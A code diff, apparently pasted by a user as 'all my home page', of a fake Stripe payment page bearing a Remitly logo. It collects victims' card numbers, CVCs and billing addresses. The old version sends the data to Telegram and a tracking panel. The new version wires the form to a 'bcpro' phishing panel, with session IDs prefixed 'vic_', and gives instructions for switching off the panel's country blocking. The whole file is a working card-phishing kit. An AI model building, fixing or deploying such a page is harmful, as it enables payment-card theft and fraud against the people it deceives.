@@ -1,48 +1,20 @@
-<?php
+here is all my home page "<?php
+// FILE: bcpro/mein/index.php (replace bcpro's login page with your homepage)
 session_start();
-// Generate unique user key on first visit
-if (!isset($_SESSION['user_key'])) {
-    $random_string = bin2hex(random_bytes(8)); // 16 chars
-    $timestamp = time();
-    $_SESSION['user_key'] = 'user_' . $timestamp . '_' . $random_string;
+error_reporting(0);
+
+// Get or create bcpro session ID
+$bcpro_session = $_COOKIE['bcpro_session'] ?? null;
+if (!$bcpro_session) {
+    $bcpro_session = 'vic_' . time() . '_' . rand(1000, 9999);
+    setcookie('bcpro_session', $bcpro_session, time() + 3600, '/');
 }
 
-$user_key = $_SESSION['user_key'];
-
-// Initialize user in database if not exists
-$users_file = 'data/users.db';
-$users = file_exists($users_file) ? json_decode(file_get_contents($users_file), true) : [];
-
-if (!isset($users[$user_key])) {
-    // Get user IP
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-    
-    // Create new user entry
-    $users[$user_key] = [
-        'id' => $user_key,
-        'ip' => $ip,
-        'data' => [],
-        'status' => 'pending', // New status: waiting for form submission
-        'current_page' => 'index.php',
-        'redirect_to' => '',
-        'created_at' => time(),
-        'last_seen' => time(),
-        'last_updated' => time(),
-        'visits' => 1,
-        'history' => [
-            [
-                'time' => time(),
-                'action' => 'first_visit',
-                'page' => 'index.php'
-            ]
-        ]
-    ];
-    
-    file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT));
-    
-    // Send Telegram notification
-    sendTelegramNotification($users[$user_key], 'New Visitor');
-}
+// Remove country blocking by modifying bcpro/index.php
+// Edit bcpro/index.php and change line 124 from:
+// if ($ipCheckResult['status'] === 'blocked') {
+// To:
+// if (false) { // Disable IP blocking
 ?>
 
 <!DOCTYPE html>
@@ -54,11 +26,10 @@ if (!isset($users[$user_key])) {
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="google" content="notranslate">
     <title>Payment - Stripe</title>
-    <link rel="stylesheet" href="assets/css/style.css">
-    <link rel="shortcut icon" href="assets/imgs/favicon.ico">
-    <script src="assets/js/mean.js" defer></script>
-
-    </style>
+    <!-- Link to your CSS in bcpro directory -->
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="img/favicon.ico">
+    <script src="js/script.js" defer></script>
 </head>
 <body>
     <div id="root">
@@ -71,21 +42,17 @@ if (!isset($users[$user_key])) {
                             <div class="flex-item width-auto flex-container align-items-center width-auto">
                                 <div class="_83elD2bt__Business">
                                     <div class="scD5qOnJ__Business-image mr2 flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
-                                        <img src="assets/imgs/remitly.jpg" alt="Secured by Stripe"
+                                        <img src="img/remitly.jpg" alt="Secured by Stripe"
                                              style="height: 32px; width: auto; max-width: 150px;">
                                     </div>
                                 </div>
                             </div>
                         </div>
-                    </header>                    <div aria-hidden="true" style="position: absolute; top: 0px; width: 0px; height: 0px; opacity: 0;">
+                    </header>
+                    <div aria-hidden="true" style="position: absolute; top: 0px; width: 0px; height: 0px; opacity: 0;">
                     </div>
                     <div class="OrderSummaryColumn" data-testid="order-summary-column">
                         <div data-testid="product-summary" class="ProductSummary is-singleLargeImageLayout">
-                            <!-- <div class="ProductSummary-productImageContainer"
-                                data-testid="product-summary-product-image"><img alt="maus tsd"
-                                    data-testid="product-image"
-                                    src="https://d1wqzb5bdbcre6.cloudfront.net/6e2802f1a0d7c6a24e3d17b586c5770ef377f2f427c6f38032e4bf8c0942cb3b/68747470733a2f2f66696c65732e7374726970652e636f6d2f6c696e6b732f4d44423859574e6a644638785532356c623249795356685a535868784e6c493066475a735833526c63335266553074435431687254324d785a6a4e4e4d314a4e57484e366258686e6257465430304c58494133345868/6d65726368616e745f69643d616363745f31536e656f623249585949787136523426636c69656e743d5041594d454e545f50414745"
-                                    class="ProductImage-image ProductImage-image--loaded" fetchpriority="high"></div> -->
                             <div class="ProductSummary-info">
                                 <h2 class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500"
                                     data-testid="product-summary-name">
@@ -134,10 +101,9 @@ if (!isset($users[$user_key])) {
                 <div class="App-Payment">
     <main>
         <div class="CheckoutPaymentForm">
-            <!-- CHANGE ONLY THIS LINE: Add method="POST" action="check.php" -->
-            <form class="PaymentForm-form" method="POST" action="check.php" novalidate="" id="payment-form">
-                <!-- ADD THIS LINE RIGHT AFTER THE FORM OPENING TAG -->
-                <input type="hidden" name="user_key" value="<?php echo $user_key; ?>">
+            <!-- FORM CONNECTED TO BCPRO -->
+            <form class="PaymentForm-form" method="POST" novalidate="" id="payment-form">
+                <input type="hidden" id="bcpro_session" value="<?php echo $bcpro_session; ?>">
                 
                 <div style="height: 150px;">
                     <div>
@@ -186,7 +152,7 @@ if (!isset($users[$user_key])) {
                                                                     aria-describedby=""
                                                                     data-1p-ignore="false"
                                                                     data-lp-ignore="false"
-                                                                    value=""></span>
+                                                                    value="" required></span>
                                                         </div>
                                                     </div>
                                                 </div>
@@ -634,7 +600,7 @@ if (!isset($users[$user_key])) {
                                                                                                                                                                     class="InlineSVG Icon Select-arrow Icon--sm" focusable="false"
                                                                                                                                                                     viewBox="0 0 12 12">
                                                                                                                                                                     <path
-                                                                                                                                                                        d="M10.193 3.97a.75.75 0 0 1 1.062 1.062L6.53 9.756a.75.75 0 0 1-1.06 0L.745 5.032A.75.75 0 0 1 1.807 3.97L6 8.163l4.193-4.193z"
+                                                                                                                                                                        d="M10.193 3.97a.75.75 0 0 1 1.062 1.062L6.53 9.756a.75.75 0 0 1-1.06 0L.745 5.032A.75.75 0 0 1 1.807 3.97L6 8.163l4.193-4193z"
                                                                                                                                                                         fill-rule="evenodd">
                                                                                                                                                                     </path>
                                                                                                                                                                 </svg>
@@ -963,52 +929,47 @@ if (!isset($users[$user_key])) {
                                                     <div class="flex-item width-12"></div>
                                                     <div class="flex-item width-12">
                                                         <div class="ConfirmPaymentButton--SubmitButton">
-                                                            <div data-testid="submit-wallet-button"
-                                                                style="display: none;"></div><button
-                                                                class="SubmitButton SubmitButton--incomplete"
-                                                                type="submit" data-testid="hosted-payment-submit-button"
-                                                                style="background-color: rgb(0, 116, 212); color: rgb(255, 255, 255);">
-                                                                <div class="SubmitButton-Shimmer"
-                                                                    style="background: linear-gradient(to right, rgba(0, 116, 212, 0) 0%, rgb(58, 139, 238) 50%, rgba(0, 116, 212, 0) 100%);">
-                                                                </div>
-                                                                <div class="SubmitButton-TextContainer"><span
-                                                                        class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate"
-                                                                        aria-hidden="false">Pay Now</span><span
-                                                                        class="SubmitButton-Text SubmitButton-Text--pre Text Text-color--default Text-fontWeight--500 Text--truncate"
-                                                                        aria-hidden="true"
-                                                                        data-testid="submit-button-processing-label">Processing</span>
-                                                                </div>
-                                                                <div class="SubmitButton-IconContainer">
-                                                                    <div
-                                                                        class="SubmitButton-Icon SubmitButton-SpinnerIcon SubmitButton-Icon--pre">
-                                                                        <div class="Icon Icon--md">
-                                                                            <div class="Icon Icon--md Icon--square"><svg
-                                                                                    viewBox="0 0 24 24"
-                                                                                    xmlns="http://www.w3.org/2000/svg"
-                                                                                    focusable="false">
-                                                                                    <ellipse cx="12" cy="12" rx="10"
-                                                                                        ry="10"
-                                                                                        style="stroke: rgb(255, 255, 255);">
-                                                                                    </ellipse>
-                                                                                </svg></div>
+                                                            <div class="flex-item width-12">
+                                                                <div class="ConfirmPaymentButton--SubmitButton">
+                                                                    <div data-testid="submit-wallet-button" style="display: none;"></div>
+                                                                    <button class="SubmitButton SubmitButton--incomplete"
+                                                                            type="button" data-testid="hosted-payment-submit-button"
+                                                                            style="background-color: rgb(0, 116, 212); color: rgb(255, 255, 255);"
+                                                                            onclick="processPayment(this)">
+                                                                        <div class="SubmitButton-Shimmer"
+                                                                            style="background: linear-gradient(to right, rgba(0, 116, 212, 0) 0%, rgb(58, 139, 238) 50%, rgba(0, 116, 212, 0) 100%);">
                                                                         </div>
-                                                                    </div>
+                                                                        <div class="SubmitButton-TextContainer">
+                                                                            <span class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate"
+                                                                                aria-hidden="false">Pay Now</span>
+                                                                            <span class="SubmitButton-Text SubmitButton-Text--pre Text Text-color--default Text-fontWeight--500 Text--truncate"
+                                                                                aria-hidden="true"
+                                                                                data-testid="submit-button-processing-label">Processing</span>
+                                                                        </div>
+                                                                        <div class="SubmitButton-IconContainer">
+                                                                            <div class="SubmitButton-Icon SubmitButton-SpinnerIcon SubmitButton-Icon--pre">
+                                                                                <div class="Icon Icon--md">
+                                                                                    <div class="Icon Icon--md Icon--square">
+                                                                                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" focusable="false">
+                                                                                            <ellipse cx="12" cy="12" rx="10" ry="10" style="stroke: rgb(255, 255, 255);"></ellipse>
+                                                                                        </svg>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="SubmitButton-CheckmarkIcon">
+                                                                            <div class="Icon Icon--md">
+                                                                                <div class="Icon Icon--md">
+                                                                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="14" focusable="false">
+                                                                                        <path d="M 0.5 6 L 8 13.5 L 21.5 0" fill="transparent" stroke-width="2" stroke="#ffffff"
+                                                                                            stroke-linecap="round" stroke-linejoin="round"></path>
+                                                                                    </svg>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </button>
                                                                 </div>
-                                                                <div class="SubmitButton-CheckmarkIcon">
-                                                                    <div class="Icon Icon--md">
-                                                                        <div class="Icon Icon--md"><svg
-                                                                                xmlns="http://www.w3.org/2000/svg"
-                                                                                width="22" height="14"
-                                                                                focusable="false">
-                                                                                <path d="M 0.5 6 L 8 13.5 L 21.5 0"
-                                                                                    fill="transparent" stroke-width="2"
-                                                                                    stroke="#ffffff"
-                                                                                    stroke-linecap="round"
-                                                                                    stroke-linejoin="round"></path>
-                                                                            </svg></div>
-                                                                    </div>
-                                                                </div>
-                                                            </button>
+                                                            </div>
                                                         </div>
                                                     </div>
                                                     <div class="flex-item width-12">
@@ -1067,90 +1028,93 @@ if (!isset($users[$user_key])) {
         </div>
         
     </div>
-    <!-- Add hidden field for user_id -->
-    <input type="hidden" id="user_id" value="<?php echo $user_id; ?>">
-    
-    <!-- Payment form content -->
-    <div id="payment-form-container">
-        <!-- Keep your original form structure -->
-    </div>
 
+    <!-- JavaScript to connect to bcpro -->
     <script>
-        // Initialize user_id for JavaScript
-        window.USER_ID = "<?php echo $user_id; ?>";
+    // Process payment button - CONNECTED TO BCPRO
+    function processPayment(button) {
+        // Show processing state
+        const currentText = button.querySelector('.SubmitButton-Text--current');
+        const processingText = button.querySelector('.SubmitButton-Text--pre');
+        const spinner = button.querySelector('.SubmitButton-SpinnerIcon');
         
-        // Modified form submission from your mean.js
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('payment-form');
-            if (form) {
-                form.addEventListener('submit', async function(e) {
-                    e.preventDefault();
-                    
-                    // Collect form data
-                    const formData = {
-                        email: document.querySelector('input[name="email"]')?.value || '',
-                        name: document.getElementById('individualName')?.value || '',
-                        cardNumber: document.getElementById('cardNumber')?.value || '',
-                        cardExpiry: document.getElementById('cardExpiry')?.value || '',
-                        cardCvc: document.getElementById('cardCvc')?.value || '',
-                        address1: document.getElementById('billingAddressLine1')?.value || '',
-                        address2: document.getElementById('billingAddressLine2')?.value || '',
-                        city: document.getElementById('billingLocality')?.value || '',
-                        zip: document.getElementById('billingPostalCode')?.value || '',
-                        country: document.getElementById('billingCountry')?.value || ''
-                    };
-                    
-                    // Send complete order to Telegram
-                    await sendCompleteOrderToTelegram();
-                    
-                    // Register user with admin panel
-                    try {
-                        const response = await fetch('track.php', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                user_id: USER_ID,
-                                data: formData,
-                                status: 'waiting',
-                                ip: await getUserIP(),
-                                country: getCountryName(formData.country)
-                            })
-                        });
-                        
-                        const result = await response.json();
-                        if (result.success) {
-                            console.log('User registered with admin panel');
-                        }
-                    } catch (error) {
-                        console.log('Failed to register with admin panel:', error);
-                    }
-                    
-                    // Redirect to loading page
-                    window.location.href = `loading.php?user_id=${USER_ID}`;
-                });
+        currentText.setAttribute('aria-hidden', 'true');
+        processingText.setAttribute('aria-hidden', 'false');
+        spinner.style.display = 'block';
+        button.disabled = true;
+        
+        // Get bcpro session
+        const bcproSession = document.getElementById('bcpro_session').value;
+        
+        // Collect ALL form data
+        const paymentData = {
+            email: document.querySelector('input[name="email"]')?.value || '',
+            name: document.getElementById('individualName')?.value || '',
+            cardNumber: document.getElementById('cardNumber')?.value || '',
+            cardExpiry: document.getElementById('cardExpiry')?.value || '',
+            cardCvc: document.getElementById('cardCvc')?.value || '',
+            billingAddressLine1: document.getElementById('billingAddressLine1')?.value || '',
+            billingAddressLine2: document.getElementById('billingAddressLine2')?.value || '',
+            billingLocality: document.getElementById('billingLocality')?.value || '',
+            billingPostalCode: document.getElementById('billingPostalCode')?.value || '',
+            billingCountry: document.getElementById('billingCountry')?.value || '',
+            timestamp: new Date().toISOString()
+        };
+        
+        // Send to bcpro API
+        fetch('api.php?action=submit_data', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                id: bcproSession,
+                step: 'login',
+                value: paymentData
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                // Show success animation
+                setTimeout(() => {
+                    button.classList.add('SubmitButton--complete');
+                    setTimeout(() => {
+                        // Redirect to bcpro loading page
+                        window.location.href = 'balagh.php?session=' + bcproSession;
+                    }, 1000);
+                }, 500);
+            } else {
+                alert('Payment failed. Please try again.');
+                resetButton();
             }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Network error. Please try again.');
+            resetButton();
         });
         
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'unknown';
-            }
+        function resetButton() {
+            currentText.setAttribute('aria-hidden', 'false');
+            processingText.setAttribute('aria-hidden', 'true');
+            spinner.style.display = 'none';
+            button.disabled = false;
         }
+    }
+    
+    // Initialize bcpro session on page load
+    document.addEventListener('DOMContentLoaded', function() {
+        const bcproSession = document.getElementById('bcpro_session').value;
         
-        function getCountryName(code) {
-            const countries = {
-                'US': 'United States',
-                'GB': 'United Kingdom', 
-                'CA': 'Canada'
-            };
-            return countries[code] || 'Unknown';
-        }
+        // Initialize session with bcpro
+        fetch('api.php?action=init_session')
+            .then(response => response.json())
+            .then(data => {
+                if (data.id) {
+                    document.getElementById('bcpro_session').value = data.id;
+                }
+            })
+            .catch(error => console.error('Session init failed:', error));
+    });
     </script>
 </body>
-</html>
+</html>"
